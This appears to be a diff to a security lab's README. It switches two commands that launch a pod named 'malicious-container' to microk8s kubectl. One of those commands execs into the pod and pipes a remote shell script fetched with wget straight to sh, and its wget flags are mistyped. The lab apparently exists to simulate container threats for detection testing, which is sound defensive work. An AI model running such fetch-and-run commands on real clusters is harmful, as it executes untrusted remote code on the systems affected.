@@ -19,9 +19,11 @@
 
 ## Kubectl Quick Deployments 
 
-kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"
+microk8s kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"
 
-kubectl exec -it malicious-container -- /bin/sh -c "wget https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh- qO-  | sh"
+microk8s kubectl exec -it malicious-container -- /bin/sh -c "wget https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh- qO-  | sh"
+
+
 
 
 
